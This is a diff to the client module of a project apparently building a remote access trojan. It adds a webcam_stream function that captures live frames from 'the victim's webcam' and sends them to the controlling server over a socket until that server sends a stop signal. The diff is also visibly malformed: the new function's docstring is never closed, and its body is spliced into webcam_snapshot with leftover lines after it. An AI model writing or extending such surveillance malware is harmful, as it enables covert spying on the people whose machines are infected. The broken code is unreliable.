@@ -10,8 +10,10 @@ Compatibilité : Windows et Linux.
 
 import base64
 import platform
+import socket
 from pathlib import Path
 
+from rat_project.common.protocol import decode_message, encode_message
 from rat_project.utils.logger_config import setup_logger
 
 logger = setup_logger("client.actions")
@@ -214,6 +216,23 @@ def get_system_info() -> str:
     )
     return result.stdout.strip() or result.stderr.strip() or "Aucune sortie"
 
+# ---------------------------------------------------------------------------
+# webcam_stream — stream live video from the victim's webcam
+# ---------------------------------------------------------------------------
+
+
+def webcam_stream(conn: socket.socket) -> None:
+    """
+    Stream live webcam frames to the server until a stop signal is received.
+
+    Reuses the same capture + encode logic as webcam_snapshot (DRY):
+      cv2.VideoCapture → cam.read() → cv2.imencode → base64
+
+    Each frame is sent as {"type": "stream_frame", "data": "<base64 JPEG>"}.
+    The loop stops when the server sends {"type": "stream_stop"} or on error.
+
+    Args:
+        conn: TLS socket connected to the server.
 
 # ---------------------------------------------------------------------------
 # webcam_snapshot — capture a photo from the victim's webcam
@@ -235,6 +254,41 @@ def webcam_snapshot() -> str:
 
     cam = cv2.VideoCapture(0)
     if not cam.isOpened():
+        logger.warning("webcam_stream: no webcam available (index 0)")
+        conn.sendall(encode_message({"type": "stream_error", "error": "No webcam available"}))
+        return
+
+    conn.settimeout(0.05)  # short timeout to check stop signal between frames
+
+    try:
+        while True:
+            success, frame = cam.read()
+            if not success:
+                logger.warning("webcam_stream: failed to read frame")
+                break
+
+            # Same encode logic as webcam_snapshot
+            _, buffer = cv2.imencode(".jpg", frame)
+            encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
+            conn.sendall(encode_message({"type": "stream_frame", "data": encoded}))
+
+            # Check for stop signal (non-blocking)
+            try:
+                raw = conn.recv(4096)
+                if raw:
+                    msg = decode_message(raw.decode("utf-8").strip())
+                    if msg.get("type") == "stream_stop":
+                        break
+            except TimeoutError:
+                pass  
+
+    except Exception as exc:
+        logger.exception("webcam_stream error: %s", exc)
+
+    finally:
+        cam.release()
+        conn.settimeout(None)  # restore blocking mode
+        logger.info("webcam_stream: stopped")
         logger.warning("webcam_snapshot: no webcam available (index 0)")
         return ""
 
